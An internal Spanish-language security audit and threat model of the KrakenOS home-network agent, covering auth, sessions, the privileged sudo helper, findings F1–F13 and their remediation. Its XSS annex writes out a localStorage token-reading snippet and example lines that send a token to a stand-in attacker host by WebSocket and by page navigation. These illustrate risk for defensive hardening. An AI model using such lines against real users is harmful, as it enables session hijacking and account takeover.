# Modelo de amenazas y auditoría de seguridad (US-73)

> Auditoría de seguridad de KrakenOS — junio 2026. Revisa el código real de
> autenticación, autorización, criptografía de sesión y el límite de privilegios
> (helper sudoers). **No modifica código de producción**: identifica la postura
> actual, dónde un control está sólo respaldado por *código + unit test* (nunca
> ejercido contra un atacante real ni hardware real) y propone US de remediación.
>
> Alcance leído: `src/plugins/auth.ts`, `security-headers.ts`, `rate-limit-store.ts`,
> `socketio.ts`, `audit.ts`, `src/auth/keyring.ts`, `modules/auth/`, `modules/setup/`,
> `modules/webauthn/`, `src/webauthn/`, `src/privileged/runner.ts`,
> `scripts/krakenos-helper.sh` + `.sudoers.example`, `firewall/iptables.*`, `config/env.ts`,
> `server.ts`. Referencia de diseño: `SPECS.md §9`, `CLAUDE.md`, `BACKLOG.md`.

---

## 1. Resumen ejecutivo

KrakenOS tiene una postura de seguridad **deliberada y por encima de la media** para
una herramienta doméstica: JWT RS256 con rotación de claves por `kid`, refresh tokens
persistidos sólo como hash y rotatorios, bcrypt cost 12, 2FA WebAuthn atado al primer
factor, cabeceras de seguridad estrictas, validación JSON Schema en el borde, WebSocket
autenticado en el handshake y un proceso no-root que delega lo privilegiado en un helper
con allowlist. La comparación *afirmado vs. real* confirma que casi todo lo que `SPECS §9`
promete **está implementado de verdad**.

Los hallazgos no son agujeros abiertos sino **límites de defensa en profundidad** y
**controles sin verificar contra un adversario o hardware real**. Los tres más relevantes:

1. **El helper privilegiado acota el *verbo*, no el *ámbito*** (🟠): permitía `iptables`
   sobre cualquier cadena, `tc` sobre cualquier interfaz y `wg set` arbitrario. Es el
   último muro antes de root. ✅ **Resuelto en US-74**: el helper acota ahora también el
   ámbito (cadena/interfaz); ver F1.
2. **Ajustes "en caliente" sin cota superior** (🟠): `accessTokenTtl` y `loginRateLimit`
   se leían de `Setting` sin máximo; un valor enorme degradaba silenciosamente la sesión corta
   o el rate limit. ✅ **Resuelto en US-75** (cotas al escribir y al leer); ver F5.
3. **`TRUST_PROXY` es un booleano sin lista de proxies de confianza** (🟠): _resuelto en US-76_ (ahora
   admite nº de hops o lista de IPs/CIDRs y avisa del `true` inseguro; ver F2). Mal configurado,
   permite falsificar `X-Forwarded-For` y burlar el rate limit y la auditoría por IP.

Y un meta-hallazgo honesto: **todo el límite de privilegios (helper, sudoers, iptables/tc/wg)
es mock-first y nunca se ha ejercido con root ni hardware real** (este entorno no los tiene;
ver `BACKLOG.md → Checklist`). Su corrección está respaldada por unit tests al contrato, no
por una verificación e2e.

---

## 2. Fronteras de confianza (trust boundaries)

```
   Internet
      │  (sin puertos de UI expuestos — sólo el endpoint WireGuard UDP)
      ▼
┌───────────────────────────────────────────────┐  ── Frontera A: VPN ──
│  WireGuard (10.8.0.0/24)                        │  Internet ↔ red interna
└───────────────────────────────────────────────┘
      │  HTTPS/WS sobre la VPN o LAN
      ▼
┌───────────────────────────────────────────────┐  ── Frontera B: API/Auth ──
│  Agente Fastify (proceso NO root)              │  cliente ↔ agente
│   · JWT RS256 + Keyring (kid)                  │  (pre-auth vs. autenticado vs. admin)
│   · Socket.io (auth en handshake)             │
└───────┬───────────────────────┬───────────────┘
        │                       │
        │ sudo -n               │ Prisma / fs
        ▼                       ▼
┌──────────────────┐   ┌────────────────────────┐  ── Frontera C: privilegio ──
│ krakenos-helper  │   │ SQLite (dev.db) + keys/ │  agente(no-root) ↔ root
│  (root, allowlist)│   │  + data/*.json + .env  │  ── Frontera D: datos en disco ──
└────────┬─────────┘   └────────────────────────┘
         │ wg / iptables / tc (root)
         ▼
┌───────────────────────────────────────────────┐  ── Frontera E: integración ──
│ Hardware: routers (SSH/REST), switches (SNMP), │  agente ↔ dispositivos
│ IoT (MQTT/HTTP/UDP), cámaras (RTSP)            │  (credenciales en .env)
└───────────────────────────────────────────────┘
```

| Frontera | Cruce | Control principal | Estado |
|---|---|---|---|
| **A — VPN** | Internet → red interna | WireGuard; ningún puerto de UI expuesto | Diseño correcto; **sin verificar con túnel real** |
| **B — API/Auth** | Cliente → agente | JWT RS256 (`authenticate`/`requireRole`), rate limit, WS auth en handshake | Implementado y unit-tested |
| **C — Privilegio** | Agente (no-root) → root | `SudoHelperRunner` + `krakenos-helper.sh` (allowlist) + sudoers `NOPASSWD` acotado a un binario | Implementado; allowlist por **verbo + ámbito** (cadena/interfaz, US-74 ✔) · **sin ejercer con root real** |
| **D — Datos en disco** | Proceso → SQLite/`keys/`/`.env`/`data/` | Permisos de fichero del SO; `keys/`,`*.db`,`.env` gitignored | Depende del despliegue; secretos en claro (F8) |
| **E — Integración** | Agente → hardware | Transporte inyectable; credenciales por `env` | Mock-first; **sin verificar con hardware** |

---

## 3. Activos

| Activo | Dónde vive | Protección actual | Impacto si se compromete |
|---|---|---|---|
| **Clave privada RS256** | `keys/*.pem` (disco, gitignored) | Permisos de fichero; cargada en memoria al arrancar (`env.ts:140`) | Falsificar **cualquier** sesión (access/refresh/mfa) |
| **Access token** | Cliente (memoria/localStorage) | Firmado RS256, `iss`/`aud`, `exp` 900 s, `type:'access'` | Acceso de lectura/escritura hasta `exp`; **no revocable** (F9) |
| **Refresh token** | Cliente + **hash sha256** en `RefreshToken` | Rotatorio, revocable, sólo hash en DB | Renovar sesión hasta revocación; sin detección de reuso (F4) |
| **Token `mfa-pending`** | Cliente, 120 s | Firmado, `type:'mfa-pending'`, `sub` cruzado con email | Reintentos de 2FA durante 120 s (no es access token) |
| **Hash de contraseña** | `User.passwordHash` | bcrypt cost 12 | Crackeo offline (mitigado por coste) |
| **Hash de backup codes** | `BackupCode.codeHash` | sha256 de 48 bits aleatorios | Bypass de 2FA si se filtra DB **y** se invierte (alta entropía) |
| **Clave pública WebAuthn** | `WebAuthnCredential.publicKey` | No es secreta; nunca expuesta por la API | Bajo |
| **Credenciales de hardware** | `.env` / `process.env` en claro | Permisos de fichero | SSH/REST/MQTT a routers, IoT y cámaras (F8) |
| **Helper sudo (root)** | `/usr/local/bin/krakenos-helper` | sudoers `NOPASSWD` + allowlist por verbo y ámbito (US-74) | Acotado a la cadena/interfaz dedicadas (F1 ✔) |
| **Claves VAPID** | `Setting` (DB) | Sólo envío push; no es factor de auth | Bajo |
| **Contraseñas WiFi** | Sólo en memoria, delegadas al driver | Nunca devueltas en GET | No persistidas |
| **Log de auditoría** | `AuditLog` | `detail` truncado a 1 KB; best-effort | Pérdida silenciosa bajo carga (F11); PII de emails fallidos |

---

## 4. STRIDE por punto de entrada

### 4.1 `POST /api/auth/login` (público)
| Amenaza | Análisis |
|---|---|
| **S**poofing | Anti-enumeración con `bcrypt.compare` de tiempo constante incluso si el usuario no existe (`auth.service.ts:161-167`). ✔ |
| **T**ampering | JSON Schema estricto (`additionalProperties:false`, email/longitud). ✔ |
| **R**epudiation | `auth.login` / `auth.login_failed` auditados con IP. ✔ (best-effort, F11) |
| **I**nfo disclosure | Mensaje genérico "Credenciales inválidas"; sin distinguir usuario inexistente. ✔ |
| **D**oS | Rate limit por IP (`max=rateLimitStore.getCurrent()`, def. 10/min). Parcial: **sin lockout por cuenta** (F3). El spoofing por XFF se acotó en US-76 (F2: nº de hops / lista de proxies). |
| **E**oP | Sin passkey → emite sesión; con passkey → sólo `mfaToken` (no tokens). Atadura de factores correcta. ✔ |

### 4.2 `POST /api/auth/refresh` (token de refresco)
- **T/E**: verifica firma por `kid`, exige `type:'refresh'`, comprueba hash en DB, revocado/expirado (`auth.service.ts:214-248`). ✔
- **R/Replay**: rota (revoca el actual, emite nuevo). **Sin detección de reuso** → un refresh robado y usado sólo provoca cierre de sesión del legítimo, sin revocar la familia ni alertar (F4).
- **D**: rate limit 60/min por IP. ✔

### 4.3 `POST /api/setup/init` (público sólo si `user.count()==0`)
- **E**: transacción atómica `user + homeName`; el segundo `/init` en carrera recibe 409 (US-53). ✔
- **Spoofing de identidad inicial**: en una instalación recién arrancada, **el primer cliente que llega gana el admin** (sin token out-of-band). Ventana de "first-boot" en LAN/VPN (F10).

### 4.4 `POST /api/webauthn/authenticate/{options,verify}` y `/backup-codes/verify` (públicos)
- **E**: exigen `mfaToken` válido y `token.sub === user(email).id` (US-51, `webauthn.routes.ts:73-82`). La passkey **suma** factor, no reemplaza. ✔
- **R/Replay**: challenge consumido **antes** de verificar (de un solo uso, US-58, `webauthn.service.ts:245-256`). ✔
- **Concurrencia**: el challenge es **un único campo en `User`**; dos ceremonias simultáneas (dos pestañas, registro+login) se pisan (F6, usabilidad/DoS suave).
- **R**: fallos auditados como `auth.login_failed`. ✔

### 4.5 API autenticada (lectura) / admin (escritura)
- **E**: `authenticate` exige `type:'access'`; `requireRole('admin')` para escritura (`auth.ts:111-143`). Cobertura parametrizada por módulo (US-61: viewer→403, sin token→401). ✔
- **T**: JSON Schema por ruta con `additionalProperties:false` y `response` (US-61 valida bordes). ✔

### 4.6 Handshake de Socket.io (`io.use`)
- **S/E**: exige access token válido (`type:'access'`) en `auth.token` o `Bearer` (`socketio.ts:58-75`). ✔
- **Revocación**: auth **sólo en el handshake**; la conexión sigue viva tras expirar/revocarse el token (F7).

### 4.7 Invocación del helper privilegiado (`SudoHelperRunner` → `sudo -n helper`)
- **T/E**: `execFile` (sin shell) → no hay inyección de shell; argv pasa literal (`runner.ts:29-40`). ✔
- **E (ámbito)**: ✅ la allowlist del helper filtra **el verbo** (`iptables -A`, `tc qdisc`, `wg set`…) **y el ámbito** — cadena/interfaz (US-74, F1). Defensa en profundidad completada en el camino privilegiado.

### 4.8 Endpoints públicos de la pantalla de login
- `GET /api/system/info` → `{homeName, version}`; `GET /api/auth/last-session` → `{timestamp, ip}`.
- **I**: divulgación pre-auth de versión (apoyo a fingerprinting/CVE) e IP+hora del último login admin (F5). Por diseño (US-49), pero sin autenticar.

---

## 5. Tabla de hallazgos (afirmado vs. real)

> Severidad: 🔴 alta · 🟠 media · 🟡 baja. Ninguno es un agujero explotable de forma
> trivial desde fuera de la VPN; todos son **endurecimientos** o **controles sin verificar**.

| # | Sev | Hallazgo | Ubicación | Afirmado | Real |
|---|---|---|---|---|---|
| **F1** | 🟠 | **Allowlist del helper sólo por verbo, no por ámbito.** Permitía `iptables` sobre cualquier cadena (INPUT/FORWARD/…), `tc` sobre cualquier interfaz y `wg set`/`wg-quick save` arbitrarios. Es la última frontera antes de root. | `scripts/krakenos-helper.sh` | "allowlist estricta… no concede acceso libre a wg/iptables/tc" (CLAUDE.md, sudoers) | ✅ **Mitigado (US-74):** el helper acota ahora también el **ámbito** — `iptables` solo sobre la cadena `KRAKENOS` (+ enlace `FORWARD -j KRAKENOS`, sin reglas extra, sin otra tabla que `filter`), `tc` solo sobre la interfaz de QoS (`dev <iface>`) y `wg`/`wg-quick` solo sobre la interfaz WireGuard. El ámbito lo fija root (defaults del script + `/etc/krakenos/helper.conf`); `sudo` (env_reset) impide que el agente lo amplíe. Tests por caso permitido/denegado. |
| **F2** | 🟠 | **`TRUST_PROXY` booleano sin proxies de confianza.** Activado sin un proxy que reescriba `X-Forwarded-For`, el cliente falsifica `req.ip` → burla rate limit de login y envenena la auditoría/last-session. | `config/env.ts` (`parseTrustProxy`), `server.ts` | "TRUST_PROXY opcional… tras nginx" (SPECS §9) | ✅ **Mitigado (US-76):** `parseTrustProxy` admite **nº de hops** (`TRUST_PROXY=1`) o **lista de IPs/CIDRs** de proxies de confianza, no solo el booleano; `true` (confiar en cualquiera) sigue por compat pero **avisa al arrancar** (`trustProxyWarnings`). Tests de `req.ip` con/sin proxy. |
| **F3** | 🟠 | **Rate limit de login sólo por IP, sin lockout por cuenta** ni backoff. Fuerza bruta distribuida (varias IP de VPN) o spray sobre muchas cuentas no se frena por usuario. | `auth.routes.ts:48-52`, `rate-limit-store.ts:13` | "Rate limiting en /auth/login" (SPECS §9) | Existe y es configurable en caliente, pero es por IP. 🟡 **Parcial (US-88):** rate-limit extendido a los endpoints públicos de 2FA + `mfaToken` de un solo uso (anti-replay/brute-force de códigos). **Falta** el lockout por cuenta (US-77). |
| **F4** | 🟠 | **Rotación de refresh sin detección de reuso.** Un refresh robado y usado revoca el del legítimo (lo desloguea) pero no revoca la familia ni alerta; el atacante se queda con la sesión rotada. | `auth.service.ts:214-248` | "refresh tokens rotatorios" (SPECS §9) | Rota y revoca, sí. **Sin** reuse-detection estilo OAuth (revocar familia + señal de robo). |
| **F5** | 🟠 | **Cota superior ausente en ajustes en caliente.** `accessTokenTtl` (y `loginRateLimit`) se leían de `Setting` con sólo `n>0`; un admin podía fijar un TTL enorme → access tokens casi eternos, anulando la "vida corta". | `config/settings-bounds.ts`, `auth.service.ts`, `rate-limit-store.ts` | "access de vida corta (default 900 s)" (SPECS §9) | ✅ **Mitigado (US-75):** cotas en `config/settings-bounds.ts` (`accessTokenTtl` 60–3600 s, `loginRateLimit` 1–1000) aplicadas **al escribir** (`PATCH /system/settings`, el valor guardado y devuelto se acota) y **al leer** (`accessTtl`/`rateLimitStore.update`, defensa en profundidad). Tests de borde. |
| **F6** | 🟡 | **Desafío WebAuthn = un solo campo en `User`.** Ceremonias concurrentes (registro+login, dos pestañas) se pisan el challenge → fallo/usabilidad; no es fuga, pero sí DoS suave del 2FA. | `webauthn.service.ts:230-238` | (no afirmado) | Correcto para flujo secuencial; frágil bajo concurrencia. |
| **F7** | 🟡 | **Socket.io autentica sólo en el handshake.** Tras expirar o revocarse el token, la conexión sigue recibiendo inventario/tráfico/IoT hasta desconectar. | `socketio.ts:58-75` | "lectura autenticada igual que la API" (CLAUDE.md, SPECS §9) | Igual que la API **en el momento de conectar**; sin re-verificación periódica ni corte por revocación. |
| **F8** | 🟠 | **Credenciales de integración en claro.** SSH/REST/SNMP/MQTT y `TAPO_EMAIL`/`PASSWORD` viven en `.env`/`process.env`; un `.env` legible o un compromiso del host filtra todas las credenciales de la red. | `config/env.ts` (driver/iot/vlan/dns) | "Deps opcionales… se instalan en el servidor" (CLAUDE.md) | Por diseño de electrodoméstico, pero sin almacén de secretos ni cifrado en reposo. |
| **F9** | 🟡 | **Access token no revocable antes de `exp`.** Logout/revoke sólo afectan a refresh tokens; el access vive hasta caducar (stateless). | `auth.service.ts:65-96`, `auth.ts` | "Logout con invalidación de token" (SPECS §4.1) | Se invalida el **refresh**; el access sigue válido su TTL. Aceptable con TTL corto, ahora **garantizado** por la cota de F5 (≤ 3600 s, US-75). |
| **F10** | 🟡 | **Ventana de primer admin.** `/setup/init` es público mientras no haya usuarios; el primer cliente que alcance el agente recién instalado reclama el admin (sin token out-of-band). | `setup.routes.ts:21-58` | "Admin por el wizard /setup" (CLAUDE.md) | Atómico contra carreras (US-53) ✔, pero no autentica el *primer* arranque. |
| **F11** | 🟡 | **Auditoría best-effort.** Un fallo de escritura sólo emite `log.warn`; eventos de seguridad (`login_failed`, `device.block`) pueden perderse bajo presión de DB. El `detail` guarda el email de logins fallidos (PII). | `audit.ts:26-45` | "Toda acción relevante queda registrada" (SPECS §9) | Best-effort, no transaccional; truncado a 1 KB (US-58) ✔. |
| **F12** | 🟡 | **Patrón IP/CIDR laxo.** El IPv4 no acota octetos (acepta `999.999.999.999`) y el IPv6 es permisivo. `execFile` evita el shell y el patrón bloquea el `-` inicial, así que la inyección de argumentos a `iptables` está mitigada, pero la validación no es estricta. | `firewall.schemas.ts` (`IP_CIDR_PATTERN`) | "se validan como IP/CIDR (defensa frente a inyección…)" (SPECS §9) | ✅ **Mitigado (US-87):** validadores anti-inyección puros (`privileged/validators.ts`) en los builders de wg/qos/vlan (iface, clave WG, IPv4/CIDR con octetos acotados, tag/nombre de VLAN) + rechazo de caracteres de control en el helper. Tests adversarios por argumento. |
| **F13** | 🔴 | **Access + refresh token en `localStorage` (legibles por JS).** El store usa `zustand/persist({name:'krakenos-auth'})` → ambos tokens quedan en `localStorage`. Un XSS lee el refresh (30 días) → **toma de cuenta persistente**. Mitigado parcialmente en US-90 (CSP); el arreglo real (cookie httpOnly) queda en US-91. | `web/src/store/auth.store.ts:62-107` | "JWT… refresh persistido solo como hash" (SPECS §9 — sólo en el servidor) | En el **cliente** ambos tokens son legibles por JS. Ver Anexo (§7). |

### Controles verificados como correctos (no son hallazgos)
- **Sin `alg:none`**: la verificación fija `algorithms:['RS256']` y `allowedIss`/`allowedAud` (`auth.ts:89,103-108`); el `kid` sólo elige clave pública, nunca el algoritmo. ✔
- **Rotación RS256 por `kid`** derivado del PEM; tokens previos siguen válidos en el solape (US-64, `keyring.ts`). ✔
- **Anti-enumeración** en login con compare de tiempo constante (`auth.service.ts:161-167`). ✔
- **Atadura de factores 2FA**: `mfaToken` cruza `sub`↔email; `mfa-pending` no sirve como access (US-51). ✔
- **Challenge de un solo uso** consumido antes de verificar (US-58). ✔
- **Cabeceras de seguridad** estrictas (CSP sin inline, `frame-ancestors 'none'`, COOP/CORP, HSTS con TLS). ✔
- **Sin inyección de shell** en el camino privilegiado (`execFile`, no `exec`). ✔
- **Refresh sólo como hash sha256**; contraseñas con bcrypt 12. ✔

> **Honestidad sobre la verificación:** todos los controles del **límite de privilegios y de
> integración** (helper, sudoers, iptables/tc/wg, SSH/MQTT/SNMP) están respaldados por
> *código + unit tests al contrato*, pero **nunca se han ejercido con root ni con hardware/
> servicios reales** en este entorno (ver `BACKLOG.md → Checklist`). La frontera A (túnel
> WireGuard) y la E (dispositivos) son, a día de hoy, **garantías de diseño no probadas e2e**.

---

## 6. Lista priorizada de remediación

> Mapeada a US de seguimiento (la última historia cerrada es US-72; esta auditoría es US-73).
> Atacar **una a una** (1 historia → 1 branch → 1 merge), por severidad.

### Estado de implementación (actualización)

> La numeración de implementación divergió de la planificada (US-74…US-86): las historias de
> seguridad reales se cerraron como **US-87…US-92**. Resumen:

| US | Tema | Hallazgos | Estado |
|---|---|---|---|
| **US-87** | Validación anti-inyección en el helper privilegiado | F12 (+ refuerza F1 con control-chars) | ✅ hecho |
| **US-88** | Rate-limit + anti-replay en endpoints públicos de auth | F3 (parcial), ventana de replay del `mfaToken` | ✅ hecho |
| **US-89** | Cobertura exhaustiva de authz + validación; fix 🔴 (viewer podía `PATCH` metadatos de dispositivo) | nuevo hallazgo de authz, no en F1-F13 | ✅ hecho |
| **US-90** | Reducir radio de impacto de XSS en tokens (CSP `connect-src 'self'`) | F13 (parcial) | ✅ hecho |
| **US-92** | Secret scanning (gitleaks, bloqueante) + SAST (semgrep) en CI | endurece F8 (detecta secretos commiteados) | ✅ hecho |
| **US-74** | Allowlist del helper por ámbito (cadena/interfaz) | F1 (arreglo) | ✅ hecho |
| **US-75** | Cotas en ajustes en caliente (`accessTokenTtl`/`loginRateLimit`) | F5 (arreglo) | ✅ hecho |
| **US-76** | `TRUST_PROXY` seguro (nº de hops / lista de proxies) | F2 (arreglo) | ✅ hecho |
| **US-91** | Refresh token en cookie `httpOnly` + access sólo en memoria | F13 (arreglo real) | ⏳ pendiente |
| **US-77…US-86** | Resto de la remediación de abajo | F4/F6/F7/F8/F9/F10/F11 + e2e | ⏳ pendiente |

**Pendientes destacados:** F4 (reuso de refresh), F8 (secret store real — US-92 sólo detecta, no
cifra), y F13 completo (US-91).

### Prioridad alta (🟠) — endurecer fronteras de privilegio y sesión
1. **US-74 · Allowlist del helper por ámbito (F1).** ✅ **Hecho.** `krakenos-helper.sh` exige que
   `iptables` opere sólo sobre la cadena `KRAKENOS` (y su enlace `FORWARD -j KRAKENOS`, sin reglas
   extra ni otra tabla que `filter`), `tc` sólo sobre la interfaz configurada (`dev <iface>`) y
   `wg`/`wg-quick` sólo sobre `wg0`. Resto rechazado (64). Ámbito configurable por root (defaults +
   `/etc/krakenos/helper.conf`); `sudo`/`env_reset` impide que el agente lo amplíe. Tests del helper
   por caso permitido/denegado (incl. ámbito a medida).
2. **US-75 · Cotas en ajustes en caliente (F5).** ✅ **Hecho.** Cotas en `config/settings-bounds.ts`
   (`accessTokenTtl` 60–3600 s, `loginRateLimit` 1–1000) aplicadas al escribir y al leer. Máximo duro a `accessTokenTtl` (p. ej. ≤ 3600 s) y
   rango válido a `loginRateLimit`; ignorar/clamp fuera de rango. Test de borde.
3. **US-76 · `TRUST_PROXY` seguro (F2).** ✅ **Hecho.** `parseTrustProxy` admite nº de hops o lista de
   IPs/CIDRs de proxies de confianza, y `trustProxyWarnings` avisa del `true` inseguro al arrancar.
   Original: sustituir el booleano por número de hops o lista de proxies
   de confianza de Fastify; documentar el riesgo de XFF. Test de `req.ip` con/ sin proxy.
4. **US-77 · Lockout por cuenta + backoff en login (F3).** Contador por email (además del límite por
   IP) con backoff exponencial y desbloqueo temporal; auditar el lockout.
5. **US-78 · Detección de reuso de refresh (F4).** Al detectar un hash ya rotado/usado, revocar toda
   la familia del usuario y emitir evento de seguridad (push/auditoría).
6. **US-79 · Gestión de secretos de integración (F8).** Sacar credenciales de hardware del `.env`
   plano (fichero con permisos `0600` mínimo verificado al arrancar, o integración con un secret store);
   avisar si `.env`/`keys/` son legibles por otros.

### Prioridad media (🟡) — reducir ventana y superficie
7. **US-80 · Re-verificación de sesión en Socket.io (F7).** Re-validar el token periódicamente (o por
   TTL) y cortar conexiones cuya sesión se revocó.
8. **US-81 · Cierre de la ventana de primer admin (F10).** Token de setup out-of-band (impreso en el
   log/CLI al primer arranque) exigido por `/setup/init`.
9. **US-82 · Endurecer challenge WebAuthn (F6).** Challenge por ceremonia (tabla propia o campo con
   discriminador registro/login) para soportar concurrencia.
10. **US-83 · Reducir divulgación pre-auth (F5).** Evaluar gating o reducción de `system/info`
    (omitir `version`) y `last-session` (sólo tras primer login, o detrás de un flag).
11. **US-84 · Validación IP/CIDR estricta + fuzz (F12).** Acotar octetos/IPv6 y añadir un test
    property-based/fuzz al builder de `iptables`.
12. **US-85 · Auditoría de eventos de seguridad robusta (F11).** Cola/reintento para `login_failed`/
    `block` y minimizar PII (hash del email en `detail`).

### Riesgo conocido (no es código)
13. **US-86 · Verificación e2e del límite de privilegios con hardware/root real.** Ejercer el helper,
    sudoers e iptables/tc/wg en un despliegue real (frontera C/E) — hoy sólo mock + unit test.
    Enlaza con `BACKLOG.md → Checklist de verificación con hardware real`.

---

## 7. Anexo (US-90) — Almacenamiento de tokens en el cliente y radio de impacto de XSS

Revisión del cliente web (`apps/web/src/store/auth.store.ts`, `lib/api.ts`, `lib/socket.ts`).

### 7.1 Dónde viven exactamente los tokens

| Token | Vida | Ubicación real |
|---|---|---|
| **access** | 15 min (def.) | Estado de Zustand (memoria) **y `localStorage`** |
| **refresh** | 30 días, rotatorio | Estado de Zustand (memoria) **y `localStorage`** |

El store usa `zustand/persist` con `{ name: 'krakenos-auth' }` y **storage por defecto =
`localStorage`** (`auth.store.ts:62-107`). No hay `partialize`, así que se persiste todo el
estado: `user` + `tokens.{accessToken, refreshToken, expiresIn}`. En claro, bajo la clave
`krakenos-auth`. `lib/api.ts` lee `accessToken` del store y lo manda como `Authorization:
Bearer`; `lib/socket.ts` lo manda en el handshake; `auth.store.refresh()/logout()` leen el
`refreshToken` del store y lo mandan en el **cuerpo** de `POST /auth/refresh|logout`.
**No se usa ninguna cookie** para la sesión.

### 7.2 Radio de impacto de un XSS (si el atacante ejecuta JS en el origen)

```js
JSON.parse(localStorage['krakenos-auth']).state.tokens
// → { accessToken (15 min), refreshToken (30 días), expiresIn }
```

- **Refresh token = joya de la corona:** credencial **persistente de 30 días** que acuña
  access tokens a voluntad. Robado, da **toma de cuenta completa y duradera**, usable
  **fuera del navegador** (offline, desde cualquier sitio), y **sobrevive a la rotación**
  (el atacante rota a su favor; el legítimo se desloguea, F4).
- **Importante y honesto:** mover los tokens a memoria (sin `persist`) **no** detiene a un XSS
  *en vivo* — JS puede leer la memoria de JS (`useAuthStore.getState()`). Sólo
  quita la copia *en reposo* (tras recargar / pestaña nueva). La **única** forma de que el
  refresh sea ilegible por JS es sacarlo de JS: **cookie `httpOnly`**.

### 7.3 Evaluación de la CSP actual (`plugins/security-headers.ts`) frente a esto

| Directiva | Veredicto |
|---|---|
| `script-src 'self'` (sin `unsafe-inline`/`eval`) | **Bien.** Corta el vector principal de XSS (inline/eval/script externo). Residual: dependencia vulnerable o sink DOM. |
| `img-src 'self' data: blob:` | Bien — sin host externo ⇒ no hay exfil por `new Image().src`. |
| `connect-src 'self' ws: wss:` *(antes)* | **Agujero.** El comodín `ws:/wss:` permitía `new WebSocket('wss://atacante')` ⇒ **canal de exfiltración** del token desde un XSS. |
| `style-src 'unsafe-inline'` | Necesario (React/Recharts); se mantiene. |

**Implementado en US-90:** `connect-src 'self'` (quitados `ws:/wss:`; en CSP3 `'self'` cubre el
WebSocket del mismo origen) + `frame-src 'none'`. Con `connect-src 'self'` un XSS **ya no puede
exfiltrar** el token por `fetch`/XHR/WebSocket/beacon a un host externo (la app es local-first,
sin destinos externos legítimos).

**Límite honesto de la CSP:** sigue **sin** ser contención total. La CSP **no** impide (a) el
**abuso en-página** de la sesión (un XSS llama la API al mismo origen con el token), ni (b) la
exfiltración por **navegación de nivel superior** (`location = 'https://atacante/?'+token`, que no
gobierna `connect-src` y para la que `navigate-to` está deprecada). Por eso la CSP es **mitigación
en profundidad**, no la solución: mientras el refresh sea legible por JS, el riesgo residual es alto.

### 7.4 Decisión: por qué la cookie `httpOnly` se difiere (y no se hace ahora)

El arreglo correcto es **refresh en cookie `httpOnly`+`SameSite` + access sólo en memoria**, pero
es **demasiado invasivo para un cambio acotado y de bajo riesgo** porque toca, de forma transversal:

1. **Cuatro emisores de sesión** (`auth/login`, `setup/init`, `webauthn authenticate/verify`,
   `backup-codes/verify`) deben **fijar la cookie**, además de `auth/refresh`.
2. El **contrato por cuerpo** de `auth/refresh` y `auth/logout` (hoy reciben `refreshToken` en el
   body) cambia a leer de cookie → afecta schemas y **~28 referencias en tests**.
3. La función **"cerrar otras sesiones manteniendo la actual"** (US-41) pasa hoy el
   `keepRefreshToken` desde el cliente; con la cookie `httpOnly` el cliente ya no lo conoce →
   hay que reidentificar la sesión actual por la cookie (rediseño).
4. **Frontend:** dejar de persistir tokens + **arranque con `refresh()` por cookie al cargar**
   (hoy la sesión sobrevive a la recarga vía `localStorage`).
5. **`Secure` condicional** (dev es HTTP en `:5173` con proxy de Vite → mismo origen; prod puede ser
   HTTPS) y **postura CSRF** nueva (la cookie viaja sola ⇒ `SameSite=Lax/Strict` + posible token CSRF).

Es una historia propia, no un retoque. Hacerla aquí arriesga romper US-41 y dejar tests en rojo.

### 7.5 Veredicto y seguimiento

- **Hecho ahora (US-90, bajo riesgo):** CSP `connect-src 'self'` + `frame-src 'none'` → cierra la
  exfiltración off-origin del token. **Reduce** el radio de impacto, **no lo elimina**.
- **Pendiente (US-91 · 🔴, F13):** refresh token en cookie `httpOnly`+`SameSite`+`Secure`(condicional),
  access token sólo en memoria con bootstrap `refresh()` al cargar, rediseño de `keepRefreshToken`
  por cookie y postura CSRF. Es **la** medida que hace el refresh ilegible por JS.

---

> _Este documento es interno a la auditoría de seguridad; describe la postura a junio de 2026
> sobre el código de las US-01…US-72 (y anexos US-90). Cualquier remediación se implementa en su
> propia US y se reconcilia con `SPECS §9` y `CLAUDE.md` al cerrarse._
